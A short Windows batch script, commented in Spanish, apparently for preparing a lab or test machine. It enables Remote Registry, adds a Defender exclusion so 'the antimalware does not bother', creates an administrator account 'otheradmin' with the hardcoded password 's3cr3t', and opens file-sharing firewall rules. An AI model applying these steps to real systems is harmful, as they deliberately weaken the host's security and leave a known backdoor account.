rem reg add HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters /v DisableStrictNameChecking /t REG_DWORD /d 1 /f

REM Habilita el servicio de acceso remoto al registro
sc config RemoteRegistry start=auto
sc start RemoteRegistry

REM Que el antimalware no moleste
powershell -Command Add-MpPreference -ExclusionPath "C:\Tools"

REM Agrega el usuario "otheradmin" y lo hace administrador
net user /ADD otheradmin s3cr3t
net localgroup /ADD administrators otheradmin

REM Habilitar las conexiones de carpetas compartidas y pings.
netsh advfirewall firewall set rule group="File and Printer Sharing" new enable=Yes

pause
